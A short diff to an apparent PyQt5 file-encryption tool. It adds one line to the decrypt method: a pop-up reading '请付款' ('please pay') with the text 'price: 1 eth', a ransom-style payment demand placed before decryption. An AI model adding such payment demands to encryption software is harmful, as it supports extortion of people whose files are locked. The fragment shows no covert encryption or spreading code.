@@ -58,6 +58,7 @@ class Ui_MainWindow(QtWidgets.QMainWindow):
                 data=f1.read(83886080)
         QMessageBox.about(self, "End", "加密完成")
     def decrypt(self):
+        QMessageBox.about(self, "请付款", "价格为：1 eth")
         key=self.lineEdit.text().encode('utf-8')
         self.lineEdit.clear()
         filename, filetype = QFileDialog.getOpenFileName(self, "选取文件", "./", "All Files (*)")
